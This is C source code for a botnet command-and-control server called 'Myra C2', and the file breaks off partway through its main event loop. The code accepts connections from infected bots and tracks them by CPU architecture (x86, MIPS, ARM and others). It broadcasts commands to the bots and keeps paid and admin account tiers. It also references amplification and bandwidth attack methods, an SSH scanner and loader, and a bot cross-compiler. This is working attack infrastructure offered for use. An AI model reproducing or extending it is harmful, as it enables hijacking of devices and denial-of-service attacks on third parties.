
//╔══════════════════════════════════════════════════════╗
// Base Includes
#include <stdio.h>      // Header Files [Interpreted Modules]
#include <stdlib.h>     // Header Files [Interpreted Modules]
#include <string.h>     // Header Files [Interpreted Modules]
#include <sys/types.h>  // Header Files [Interpreted Modules]
#include <sys/socket.h> // Header Files [Interpreted Modules]
#include <netdb.h>      // Header Files [Interpreted Modules]
#include <unistd.h>     // Header Files [Interpreted Modules]
#include <time.h>       // Header Files [Interpreted Modules]
#include <fcntl.h>      // Header Files [Interpreted Modules]
#include <sys/epoll.h>  // Header Files [Interpreted Modules]
#include <errno.h>      // Header Files [Interpreted Modules]
#include <pthread.h>    // Header Files [Interpreted Modules]
#include <signal.h>     // Header Files [Interpreted Modules]
#include <ctype.h>      // Header Files [Interpreted Modules]
#include <arpa/inet.h>  // Header Files [Interpreted Modules]
#include <stdbool.h>    // Header Files [Interpreted Modules]
//╚══════════════════════════════════════════════════════╝
//╔══════════════════════════════════════════════════════╗
// Tool Includes
#include "resolver.h" // Header Files [Additional Interpreted Module]

#include "curl/curl.h"
#include "jsmn/jsmn.h"
//╚══════════════════════════════════════════════════════╝
//╔══════════════════════════════════════════════════════╗
#define max_file_descriptor_value 1000000 // Maximum File Descriptor Value Statement [1000000]
//╚══════════════════════════════════════════════════════╝
//╔══════════════════════════════════════════════════════╗
// Color Codes #Custom
#define Myra_I_Dark_Highlights = "\e[38;5;134m"     // ANSI Colours
#define Myra_I_Text = "\e[38;5;168m"                // ANSI Colours
#define Myra_I_Border = "\e[38;5;225m"              // ANSI Colours
#define Arcues_I_Bright_Highlights = "\e[38;5;134m" // ANSI Colours
//╚══════════════════════════════════════════════════════╝
//╔══════════════════════════════════════════════════════╗
// Project Information
#define Myra_I_Project "Myra C2 Source" // Defining File Principals
#define Myra_I_Developer_List ["Zach"]  // Defining File Principals
#define Myra_I_Substrate_Version "Myra I - Substrate Data System v4"
#define Myra_I_Version_Number = "Myra I Beta Version 10"
//╚══════════════════════════════════════════════════════╝
//╔══════════════════════════════════════════════════════╗
#define Myra_I_User_Tool_I = "adduser"         // Defining Tool Principals
#define Myra_I_User_Tool_II = "domainresolver" // Defining Tool Principals
#define Myra_I_User_Tool_III = "portscanner"   // Defining Tool Principals
#define Myra_I_User_Tool_VI = "IPGeoLocation"  // Defining Tool Principals
//╚══════════════════════════════════════════════════════╝
//╔══════════════════════════════════════════════════════╗
// File paths
#define Myra_I_User_File "myra.txt"                                     // Defining File Paths
#define Myra_I_IPHM_Reflection_Scanners "amp/scanners/"                 // Defining File Paths
#define Myra_I_IPHM_Reflection_Attack_Methods "amp/methods/Reflection/" // Defining File Paths
#define Myra_I_IPHM_Bandwidth_Attack_Methods "amp/methods/Bandwidth/"   // Defining File Paths
#define Myra_I_IPHM_Reflection_Lists "amp/lists"                        // Defining File Paths
//╚══════════════════════════════════════════════════════╝
//╔══════════════════════════════════════════════════════╗
// External /Scripts/ || /tools/
#define Myra_I_IPHM_Attack_Process_Killer = "c2/scripts/IPHM_Attack_Process_Killer.py"   // Defining External Tool Paths
#define Myra_I_IPHM_Scanner_Process_Killer = "c2/scripts/IPHM_Scanner_Process_Killer.py" // Defining External Tool Paths
#define Myra_I_Process_Killer_Installation = "c2/scripts/wget.py"                        // Defining External Tool Paths
#define Myra_I_IPHM_Installation_Script = "c2/IPHM_Installation.py"                      // Defining External Tool Paths
#define Myra_I_IPLookup_API = "var/www/html/iplookup.php"                                // Defining External Tool Paths
#define Myra_I_IPBlock_SSH_Scanner = "c2/scripts/scan.py"                                // Defining External Tool Paths
#define Myra_I_SSH_Loader = "c2/scripts/sshloader.py"                                    // Defining External Tool Paths
#define Myra_I_Bot_Cross_Compiler = "bot/Myra.py"                                        // Defining External Tool Paths
//╚══════════════════════════════════════════════════════╝
//╔══════════════════════════════════════════════════════╗
// Access Types (Accounts):
#define Myra_I_Account_Normal = "normal" // Defining Myra Account Identification Types
#define Myra_I_Account_Admin = "Admin"   // Defining Myra Account Identification Types
#define Myra_I_Account_VIP = "vip"       // Defining Myra Account Identification Types
#define Myra_I_Account_Owner = "owner"   // Defining Myra Account Identification Types

int read_file_contents(const char *filename, char *buf)
{
  long length;
  FILE *f = fopen(filename, "rb");

  if (f)
  {
    fseek(f, 0, SEEK_END);
    length = ftell(f);
    fseek(f, 0, SEEK_SET);
    fread(buf, 1, length, f);
    fclose(f);

    return 0;
  }
  else
  {
    perror("fopen failed: ");
    return -1;
  }
}

// Chase's sexy GeoIP stuff
/**
 * GeoIPInfo represents the data returned from an ip-api.com query
 */
typedef struct GeoIPInfo
{
  const char *status;
  const char *message;
  const char *continent;
  const char *continent_code;
  const char *country;
  const char *country_code;
  const char *region;
  const char *region_name;
  const char *city;
  const char *district;
  const char *zip;
  const char *lat;
  const char *lon;
  const char *timezone;
  const char *currency;
  const char *isp;
  const char *org;
  const char *as;
  const char *as_name;
  const char *reverse;
  bool mobile;
  bool proxy;
  const char *query;

} GeoIPInfo;

static int jsoneq(const char *json, jsmntok_t *tok, const char *s)
{
  if (tok->type == JSMN_STRING && (int)strlen(s) == tok->end - tok->start &&
      strncmp(json + tok->start, s, tok->end - tok->start) == 0)
  {
    return 0;
  }
  return -1;
}

typedef struct string
{
  char *ptr;
  size_t len;
} string;

void init_string(string *s)
{
  s->len = 0;
  s->ptr = malloc(s->len + 1);
  if (s->ptr == NULL)
  {
    fprintf(stderr, "malloc() failed\n");
    exit(EXIT_FAILURE);
  }
  s->ptr[0] = '\0';
}

size_t writefunc(void *ptr, size_t size, size_t nmemb, string *s)
{
  size_t new_len = s->len + size * nmemb;
  s->ptr = realloc(s->ptr, new_len + 1);
  if (s->ptr == NULL)
  {
    fprintf(stderr, "realloc() failed\n");
    exit(EXIT_FAILURE);
  }
  memcpy(s->ptr + s->len, ptr, size * nmemb);
  s->ptr[new_len] = '\0';
  s->len = new_len;

  return size * nmemb;
}

/**
 * Returns the geo IP information for an IP address
 *
 * @param ip_address The IP address to get the information of
 * @return GeoIPInfo
 */
GeoIPInfo ip_info(const char *ip_address)
{
  // Make sure the IP address actually confines to the size restraints of one to prevent buffer overflows

  CURL *curl = curl_easy_init();
  GeoIPInfo info;

  if (!curl)
  {
    fprintf(stderr, "Could not acquire a cURL handle\n");
    return info;
  }

  string response;
  init_string(&response);

  char url[78]; // The base URL is 39 characters, and the maximum IP address length is 39 characters for IPv6
  strcpy(url, "http://ip-api.com/json/");
  strcat(url, ip_address);
  strcat(url, "?fields=16515071");
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

  CURLcode res = curl_easy_perform(curl);
  if (res != CURLE_OK)
  {
    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    return info;
  }

  curl_easy_cleanup(curl); // Always cleanup

  jsmn_parser json_parser;
  jsmntok_t token_buffer[128]; // We expect no more than 128 JSON tokens

  jsmn_init(&json_parser);
  int r = jsmn_parse(&json_parser, response.ptr, strlen(response.ptr), token_buffer,
                     sizeof(token_buffer) / sizeof(token_buffer[0]));
  if (r < 0)
  {
    printf("Failed to parse JSON: %d\n", r);
    return info;
  }

  if (r < 1 || token_buffer[0].type != JSMN_OBJECT)
  {
    printf("Object expected\n");
    return info;
  }

  // Loop over all keys of the root object
  for (int i = 1; i < r; i++)
  {
    if (jsoneq(response.ptr, &token_buffer[i], "status") == 0)
    {
      info.status = strndup(response.ptr + token_buffer[i + 1].start,
                            token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    if (jsoneq(response.ptr, &token_buffer[i], "message") == 0)
    {
      info.message = strndup(response.ptr + token_buffer[i + 1].start,
                             token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "continent") == 0)
    {
      info.continent = strndup(response.ptr + token_buffer[i + 1].start,
                               token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "continentCode") == 0)
    {
      info.continent_code = strndup(response.ptr + token_buffer[i + 1].start,
                                    token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "country") == 0)
    {
      info.country = strndup(response.ptr + token_buffer[i + 1].start,
                             token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "countryCode") == 0)
    {
      info.country_code = strndup(response.ptr + token_buffer[i + 1].start,
                                  token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "region") == 0)
    {
      info.region = strndup(response.ptr + token_buffer[i + 1].start,
                            token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "regionName") == 0)
    {
      info.region_name = strndup(response.ptr + token_buffer[i + 1].start,
                                 token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "city") == 0)
    {
      info.city = strndup(response.ptr + token_buffer[i + 1].start,
                          token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "district") == 0)
    {
      info.district = strndup(response.ptr + token_buffer[i + 1].start,
                              token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "zip") == 0)
    {
      info.zip = strndup(response.ptr + token_buffer[i + 1].start,
                         token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "lat") == 0)
    {
      info.lat = strndup(response.ptr + token_buffer[i + 1].start,
                         token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "lon") == 0)
    {
      info.lon = strndup(response.ptr + token_buffer[i + 1].start,
                         token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "timezone") == 0)
    {
      info.timezone = strndup(response.ptr + token_buffer[i + 1].start,
                              token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "currency") == 0)
    {
      info.currency = strndup(response.ptr + token_buffer[i + 1].start,
                              token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "isp") == 0)
    {
      info.isp = strndup(response.ptr + token_buffer[i + 1].start,
                         token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "org") == 0)
    {
      info.org = strndup(response.ptr + token_buffer[i + 1].start,
                         token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "as") == 0)
    {
      info.as = strndup(response.ptr + token_buffer[i + 1].start,
                        token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "asname") == 0)
    {
      info.as_name = strndup(response.ptr + token_buffer[i + 1].start,
                             token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "reverse") == 0)
    {
      info.reverse = strndup(response.ptr + token_buffer[i + 1].start,
                             token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "mobile") == 0)
    {
      const char *mobile = strndup(response.ptr + token_buffer[i + 1].start,
                                   token_buffer[i + 1].end - token_buffer[i + 1].start);
      info.mobile = (mobile == "true");
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "proxy") == 0)
    {
      const char *proxy = strndup(response.ptr + token_buffer[i + 1].start,
                                  token_buffer[i + 1].end - token_buffer[i + 1].start);
      info.proxy = (proxy == "true");
      i++;
    }
    else if (jsoneq(response.ptr, &token_buffer[i], "query") == 0)
    {
      info.query = strndup(response.ptr + token_buffer[i + 1].start,
                           token_buffer[i + 1].end - token_buffer[i + 1].start);
      i++;
    } /*else {
            printf("Unexpected key: %.*s\n", token_buffer[i].end - token_buffer[i].start,
                   response.ptr + token_buffer[i].start);
        }*/
  }
  return info;
}

//╚══════════════════════════════════════════════════════╝
struct account // Create Account Struct.
{
  char username[200];            // username
  char password[200];            // password
  char identification_type[200]; // Admin / normal [Admin/vip/normal]
};
static struct account accounts[500];

struct myra_substrate_device_data_v4
{ // Create Client Data [Telnet] Struct.
  uint32_t internet_protocol;
  char x86;                           // Char Every Line For Output Communication
  char mips;                          // Char Every Line For Output Communication
  char arm;                           // Char Every Line For Output Communication
  char spc;                           // Char Every Line For Output Communication
  char ppc;                           // Char Every Line For Output Communication
  char sh4;                           // Char Every Line For Output Communication
  char transmitted_successfully;      // Char Every Line For Output Communication
} clients[max_file_descriptor_value]; // Set 'CLient' File Descriptor Value As Stated

struct myra_substrate_telnet_data_v4
{                                         // Create Telnet Data Struct.
  uint32_t internet_protocol;             // Unsigned_Int 32 [Internet Protocol Output]
  int transmitted_successfully;           // Use Integer To Display 'Connnected' Value
} managements[max_file_descriptor_value]; // Set 'CLient' File Descriptor Value As Stated

static volatile FILE *file_filedescription_value; // Static Volatile [Setting Each Integer For EPOLL and Listen FD]
static volatile int bindinginterpreter = 0;       // Static Volatile [Setting Each Integer For EPOLL and Listen FD]
static volatile int listeninginterpretation = 0;  // Static Volatile [Setting Each Integer For EPOLL and Listen FD]
static volatile int successful_transmission = 0;  // Static Volatile [Setting Each Integer For EPOLL and Listen FD]

int buffer_size_string_compare(unsigned char *buffer, int bufferSize, int fd) // Create Integers For Buffer Size 'Unsigned_Char'
{
  int total_output = 0, got = 1; // 0 = Deny / 1 = Accept Output
  while (got == 1 && total_output < bufferSize && *(buffer + total_output - 1) != '\n')
  {
    got = read(fd, buffer + total_output, 1);
    total_output++;
  }           // If Accepted [got == 1] - Display Output, Break line '\n'
  return got; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}
void trim_removev2(char *target_string) // Void To Char String, Do Not Output To Original Function Caller
{
  int trim_integer;                               // Output Statement Result Integers
  int start_integer = 0;                          // Output Statement Result Integers
  int finish_integer = strlen(target_string) - 1; // Output Statement Result Integers
  while (isspace(target_string[start_integer]))
    start_integer++; // Use 'While Loop' To Begin Function Call [Any Subzero Value] - [Calculus Is Irrelevant] - Check If Passed Character Is In 'White-Space'
  while ((finish_integer >= start_integer) && isspace(target_string[finish_integer]))
    finish_integer--; // Use 'While Loop' To Begin Function Call [Any Subzero Value] - [Calculus Is Irrelevant] - Check If Passed Character Is In 'White-Space'
  for (trim_integer = start_integer; trim_integer <= finish_integer; trim_integer++)
    target_string[trim_integer - start_integer] = target_string[trim_integer]; // 'I' Value - (trim_integer = start_integer; trim_integer <= finish_integer; trim_integer++)
  target_string[trim_integer - start_integer] = '\0';                          // Start String Of 'I' Value
}

static int socket_interpretation_block_v1(int save_file_content) // Create Static Integer [Static Integer, Will Allow Concurrent Bind Socket]
{
  int flag_network_integer, s;                                 // Set Flag Integer
  flag_network_integer = fcntl(save_file_content, F_GETFL, 0); // Set Flag Error Handle Output
  if (flag_network_integer == -1)                              // Set Flag Value [-1]
  {
    perror("myra_non_block_socket : failed"); // Error Handling Output
    return -1;                                // Error Value == -1
  }
  flag_network_integer |= O_NONBLOCK; // Set_Flag==NONBLOCK
  s = fcntl(save_file_content, F_SETFL, flag_network_integer);
  if (s == -1) // Error Value == -1
  {
    perror("myra_non_block_socket : failed"); // Error Handling Output
    return -1;                                // Error Value == -1
  }
  return 0; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}
/*           struct addrinfo {
               int              ai_flags;         | flag type set state   | state -> in usage -- sockstream
               int              ai_family;        | family type set state | state -> in usage -- sockstream
               int              ai_socktype;      | socket type statement | state -> in usage -- sockstream
               int              ai_protocol;      | protocol              | state -> in usage -- sockstream
               socklen_t        ai_addrlen;       | address length        | state -> in usage -- sockstream
               struct sockaddr *ai_addr;          | address               | state -> in usage -- sockstream
               char            *ai_canonname;     | n/a                   | state -> not in usage
               struct addrinfo *ai_next;          | next                  | state -> not in usage
*/
static int socket_intepretation_modified(char *port) // Socket Bind Interpretation V [ Edited By Zach, Modified Header Address For Adjacent Binding and Listening]
{
  struct addrinfo hints;                                       // Create Struct. For AddressInformation, Create 's' As Integer
  struct addrinfo *output_result_integer, *rp;                 // Create Struct. For AddressInformation, Create 's' As Integer
  int s, save_file_content;                                    // Create Struct. For AddressInformation, Create 's' As Integer
  memset(&hints, 0, sizeof(struct addrinfo));                  // Fill Data Block Using 'memset'
  hints.ai_family = AF_UNSPEC;                                 // Socket Properties - [SOCKSTREAM, AI, UNSPEC]
  hints.ai_socktype = SOCK_STREAM;                             // Socket Properties - [SOCKSTREAM, AI, UNSPEC]
  hints.ai_flags = AI_PASSIVE;                                 // Socket Properties - [SOCKSTREAM, AI, UNSPEC]
  s = getaddrinfo(NULL, port, &hints, &output_result_integer); // Defining 's' Value
  if (s != 0)                                                  // Call Function If 's' == 0
  {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s)); // Error Handling, 'Getting Address Information'
    return -1;                                             // Error Value == -1
  }
  for (rp = output_result_integer; rp != NULL; rp = rp->ai_next)
  {
    save_file_content = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol); // Socket Bind Interpretation [ Modified To Be Created As One] -- [MORE STABLE]
    if (save_file_content == -1)
      continue;  // Call Function If save_file_content == -1
    int yes = 1; // Yes == 1
    if (setsockopt(save_file_content, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
      perror("myra_setsockopt : failed");                     // Improved Sockopt Handling, Using SOL_SOCKET
    s = bind(save_file_content, rp->ai_addr, rp->ai_addrlen); // Bind Everything Stated Above
    if (s == 0)                                               // Call Function If 's' == 0
    {
      break; // Terminate Loop Function, Continue Connection [Broadcast]
    }
    close(save_file_content); // Close Concurrent Function [save_file_content]
  }
  if (rp == NULL) // rp == NULL, No Available Integer [May Modify This and State 'NULL' as 0]
  {
    fprintf(stderr, "myra_socket_binding : failed - you may be using the same binding port as before.\n"); // Error Handling - Failed Socket Binding, This is Rare, Unless Same Output Port Is Used
    return -1;                                                                                             // Error Value == -1
  }
  freeaddrinfo(output_result_integer); // Check Addresses That Have No Integer State Value '-1'
  return save_file_content;            // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}
void myra_broadcast(char *output_message, int var, char *message_vector) // Broadcast The Following On Administator [Screen]
{
  int msg_manage_val = 1; // Send Management Value Statement. This Is Usually Set As '1'
  if (strcmp(output_message, "SUCC") == 0)
    msg_manage_val = 0;                                                            // We Are Using 'SUCC/FUCC' V2. [Modified The General Network Threads, Should Stop The Source From Being Slow]
  char *broadcast_data_psl = malloc(strlen(output_message) + 10);                  // Char Every Line For Output Communication
  memset(broadcast_data_psl, 0, strlen(output_message) + 10);                      // Fill In Data Block Usinf Memset. [Add +10, To Concurrent Connection]
  strcpy(broadcast_data_psl, output_message);                                      // Strcpy Function Copies The String Pointed To By S2 Into The Object Pointed To By S1.
  trim_removev2(broadcast_data_psl);                                               // Trim : [broadcast_data_psl]
  time_t systematic_time;                                                          // We Want To Display The Time
  struct tm *arc_time_info;                                                        // Create Struct. For Time
  time(&systematic_time);                                                          // Use 'Time' Module For 'systematic_time' prefix
  arc_time_info = localtime(&systematic_time);                                     // Show Time Info Using Local Time
  char *local_time = asctime(arc_time_info);                                       // Char Every Line For Output Communication
  trim_removev2(local_time);                                                       // Trim : [local_time]
  int trim_integer;                                                                // Output Statement Result Integers
  for (trim_integer = 0; trim_integer < max_file_descriptor_value; trim_integer++) // Set I, With max_file_descriptor_value Value
  {
    if (trim_integer == var || (!clients[trim_integer].transmitted_successfully))
      continue;                                                               // Show Clients Connected To Broadcast
    if (msg_manage_val && managements[trim_integer].transmitted_successfully) // Send Management, To Show Value
    {
      send(trim_integer, "\x1b[1;35m", 9, MSG_NOSIGNAL);                        // Client Connected Output
      send(trim_integer, message_vector, strlen(message_vector), MSG_NOSIGNAL); // Client Connected Output
      send(trim_integer, ": ", 2, MSG_NOSIGNAL);                                // Client Connected Output
    }
    send(trim_integer, output_message, strlen(output_message), MSG_NOSIGNAL); // Client Connected Output
    send(trim_integer, "\n", 1, MSG_NOSIGNAL);                                // Client Connected Output
  }
  free(broadcast_data_psl); // Release Function From [broadcast_data_psl]
}
void *epollEventLoop(void *useless) // Create Struct via EPOLL, Use Void Function To Call Event
{
  struct epoll_event event;                                 // Create Struct via EPOLL, Use Void Function To Call Event
  struct epoll_event *events;                               // Create Struct via EPOLL, Use Void Function To Call Event
  int s;                                                    // Create Struct via EPOLL, Use Void Function To Call Event
  events = calloc(max_file_descriptor_value, sizeof event); // Create Struct via EPOLL, Use Void Function To Call Event
  while (1)                                                 // While == Wait 1 Second, This Is Stable
  {
    int n, trim_integer;                                                       // State 'trim_integer' And 'n'
    n = epoll_wait(bindinginterpreter, events, max_file_descriptor_value, -1); // Set 'n' With max_file_descriptor_value
    for (trim_integer = 0; trim_integer < n; trim_integer++)                   // 'n' && 'trim_integer' comp
    {
      if ((events[trim_integer].events & EPOLLERR) || (events[trim_integer].events & EPOLLHUP) || (!(events[trim_integer].events & EPOLLIN))) // Show Device Input Via EPOLL
      {
        clients[events[trim_integer].data.fd].transmitted_successfully = 0; // Our Devices -- More To Be Added -- Events Created Here
        clients[events[trim_integer].data.fd].arm = 0;                      // Our Devices -- More To Be Added -- Events Created Here
        clients[events[trim_integer].data.fd].mips = 0;                     // Our Devices -- More To Be Added -- Events Created Here
        clients[events[trim_integer].data.fd].x86 = 0;                      // Our Devices -- More To Be Added -- Events Created Here
        clients[events[trim_integer].data.fd].spc = 0;                      // Our Devices -- More To Be Added -- Events Created Here
        clients[events[trim_integer].data.fd].ppc = 0;                      // Our Devices -- More To Be Added -- Events Created Here
        clients[events[trim_integer].data.fd].sh4 = 0;                      // Our Devices -- More To Be Added -- Events Created Here
        close(events[trim_integer].data.fd);                                // Close Function
        continue;                                                           // Continue
      }
      else if (listeninginterpretation == events[trim_integer].data.fd) // Listen FD - For Events.
      {
        while (1) // While == Wait 1 Second, This Is Stable
        {
          struct sockaddr in_addr; // Create Struct For Sockaddress
          socklen_t in_len;        // SOCK DEFINE
          int infd, ipIndex;       // SOCK DEFINE

          in_len = sizeof in_addr;                                   // sock define
          infd = accept(listeninginterpretation, &in_addr, &in_len); // sock define
          if (infd == -1)                                            // sock define
          {
            if ((errno == EAGAIN) || (errno == EWOULDBLOCK))
              break; // Error Validation
            else     // Else
            {
              perror("myra_listening_interpretation : acceptance error"); // accept error handling
              break;                                                      // Terminate Process
            }
          }

          clients[infd].internet_protocol = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr; // Show Clients Connected To Broadcast
          int dup = 0;                                                                         // Value The DUPLICATES
          for (ipIndex = 0; ipIndex < max_file_descriptor_value; ipIndex++)
          { // Create Index, IP
            if (!clients[ipIndex].transmitted_successfully || ipIndex == infd)
              continue; // Check Connected
            if (clients[ipIndex].internet_protocol == clients[infd].internet_protocol)
            {          // Check Connected, IP
              dup = 1; // Dup Value == 1 [Faster]
              break;
            }
          }
          s = socket_interpretation_block_v1(infd);
          if (s == -1)
          {
            close(infd);
            break;
          }

          event.data.fd = infd;                                           // Create Struct via EPOLL, Use Void Function To Call Event
          event.events = EPOLLIN | EPOLLET;                               // Create Struct via EPOLL, Use Void Function To Call Event
          s = epoll_ctl(bindinginterpreter, EPOLL_CTL_ADD, infd, &event); // Create Struct via EPOLL, Use Void Function To Call Event
          if (s == -1)                                                    // 's' Value == -1
          {
            perror("myra_epoll_ctl : failed"); // Epollctl Error Handling
            close(infd);                       // Kill infd
            break;
          }

          clients[infd].transmitted_successfully = 1;  // I'm Getting Tired Of This..
          send(infd, "!* Myra ON\n", 9, MSG_NOSIGNAL); // Send infd, Using Command Via Client.
        }
        continue; // Keep Going,...
      }
      else // What Else.. Smh...
      {
        int clear_myra_broadcast = events[trim_integer].data.fd;                         // Unecessary To Comment, This Is Struct'in and Stating Integer.
        struct myra_substrate_device_data_v4 *client = &(clients[clear_myra_broadcast]); // Unecessary To Comment, This Is Struct'in and Stating Integer.
        int done = 0;                                                                    // Unecessary To Comment, This Is Struct'in and Stating Integer.
        client->transmitted_successfully = 1;                                            // Our Devices -- More To Be Added -- Events Created Here
        client->arm = 0;                                                                 // Our Devices -- More To Be Added -- Events Created Here
        client->mips = 0;                                                                // Our Devices -- More To Be Added -- Events Created Here
        client->sh4 = 0;                                                                 // Our Devices -- More To Be Added -- Events Created Here
        client->x86 = 0;                                                                 // Our Devices -- More To Be Added -- Events Created Here
        client->spc = 0;                                                                 // Our Devices -- More To Be Added -- Events Created Here
        client->ppc = 0;                                                                 // Our Devices -- More To Be Added -- Events Created Here
        while (1)                                                                        // While == Wait 1 Second, This Is Stable
        {
          ssize_t count;                                        // State, SSize Count
          char myra_buffer_size[3000];                          // Char Buffer To [3000] - Although, This May Change As We Want A EXTREMELY Stable Client, Testing In Progress.
          memset(myra_buffer_size, 0, sizeof myra_buffer_size); // Fill In Data-Block, This Can Also Be Stated As The Buffer Off-set [0xA - 0xB]

          while (memset(myra_buffer_size, 0, sizeof myra_buffer_size) && (count = buffer_size_string_compare(myra_buffer_size, sizeof myra_buffer_size, clear_myra_broadcast)) > 0) // Memset, Using The Stated Buffer-Size Value.
          {
            if (strstr(myra_buffer_size, "\n") == NULL)
            {
              done = 1;
              break;
            }                                // We Shall Break The Line, Stating This As Null.
            trim_removev2(myra_buffer_size); // Trim Buffer.
            if (strcmp(myra_buffer_size, "SUCC") == 0)
            { // Ping Is The Input Connection, Waiting For It's Response. This Has To Be Allocated.
              if (send(clear_myra_broadcast, "FUCC\n", 5, MSG_NOSIGNAL) == -1)
              {
                done = 1;
                break;
              } // FUCC, Is The Response From Ping, This is The Allocation.
              continue;
            }
            if (strstr(myra_buffer_size, "\e[1;37m[\e[0;31mMyra\e[1;37m] Device:[\e[0;31mx86_64\e[1;37m] Loaded!") == myra_buffer_size) // We are Loading All Of Our Devices, On The Admin Screen.
            {
              client->x86 = 1; // We are Loading All Of Our Devices, On The Admin Screen.
            }
            if (strstr(myra_buffer_size, "\e[1;37m[\e[0;31mMyra\e[1;37m] Device:[\e[0;31mx86_32\e[1;37m] Loaded!") == myra_buffer_size) // We are Loading All Of Our Devices, On The Admin Screen.
            {
              client->x86 = 1; // We are Loading All Of Our Devices, On The Admin Screen.
            }
            if (strstr(myra_buffer_size, "\e[1;37m[\e[0;31mMyra\e[1;37m] Device:[\e[0;31mMIPS\e[1;37m] Loaded!") == myra_buffer_size) // We are Loading All Of Our Devices, On The Admin Screen.
            {
              client->mips = 1; // We are Loading All Of Our Devices, On The Admin Screen.
            }
            if (strstr(myra_buffer_size, "\e[1;37m[\e[0;31mMyra\e[1;37m] Device:[\e[0;31mMPSL\e[1;37m] Loaded!") == myra_buffer_size) // We are Loading All Of Our Devices, On The Admin Screen.
            {
              client->mips = 1; // We are Loading All Of Our Devices, On The Admin Screen.
            }
            if (strstr(myra_buffer_size, "\e[1;37m[\e[0;31mMyra\e[1;37m] Device:[\e[0;31mARM4\e[1;37m] Loaded!") == myra_buffer_size) // We are Loading All Of Our Devices, On The Admin Screen.
            {
              client->arm = 1; // We are Loading All Of Our Devices, On The Admin Screen.
            }
            if (strstr(myra_buffer_size, "\e[1;37m[\e[0;31mMyra\e[1;37m] Device:[\e[0;31mARM5\e[1;37m] Loaded!") == myra_buffer_size) // We are Loading All Of Our Devices, On The Admin Screen.
            {
              client->arm = 1; // We are Loading All Of Our Devices, On The Admin Screen.
            }
            if (strstr(myra_buffer_size, "\e[1;37m[\e[0;31mMyra\e[1;37m] Device:[\e[0;31mARM6\e[1;37m] Loaded!") == myra_buffer_size) // We are Loading All Of Our Devices, On The Admin Screen.
            {
              client->arm = 1; // We are Loading All Of Our Devices, On The Admin Screen.
            }
            if (strstr(myra_buffer_size, "\e[1;37m[\e[0;31mMyra\e[1;37m] Device:[\e[0;31mARM7\e[1;37m] Loaded!") == myra_buffer_size) // We are Loading All Of Our Devices, On The Admin Screen.
            {
              client->arm = 1; // We are Loading All Of Our Devices, On The Admin Screen.
            }
            if (strstr(myra_buffer_size, "\e[1;37m[\e[0;31mMyra\e[1;37m] Device:[\e[0;31mPPC\e[1;37m] Loaded!") == myra_buffer_size) // We are Loading All Of Our Devices, On The Admin Screen.
            {
              client->ppc = 1; // We are Loading All Of Our Devices, On The Admin Screen.
            }
            if (strstr(myra_buffer_size, "\e[1;37m[\e[0;31mMyra\e[1;37m] Device:[\e[0;31mSPC\e[1;37m] Loaded!") == myra_buffer_size) // We are Loading All Of Our Devices, On The Admin Screen.
            {
              client->spc = 1; // We are Loading All Of Our Devices, On The Admin Screen.
            }
            if (strcmp(myra_buffer_size, "SUCC") == 0)
            { // Input Connection, Response Is Below
              if (send(clear_myra_broadcast, "FUCC\n", 5, MSG_NOSIGNAL) == -1)
              {
                done = 1;
                break;
              } // Response Line, SUCC/FUCC Uses Strcmp
              continue;
            }
            if (strcmp(myra_buffer_size, "FUCC") == 0)
            { // We use 'strcmp' To Compare Both Of Our Input And Output - [Response] Strings
              continue;
            } // This Is Then Used, To Output A Valid Integer
            printf("\"%s\"\n", myra_buffer_size);
          } // This Is The Output Here

          if (count == -1) // Error Value - [Show ERR]
          {
            if (errno != EAGAIN) // // Error Value - [Show ERR]
            {
              done = 1; // Error Value
            }
            break;
          }
          else if (count == 0) // // Error Value - [Show ERR]
          {
            done = 1; // // Error Value - [Show ERR]
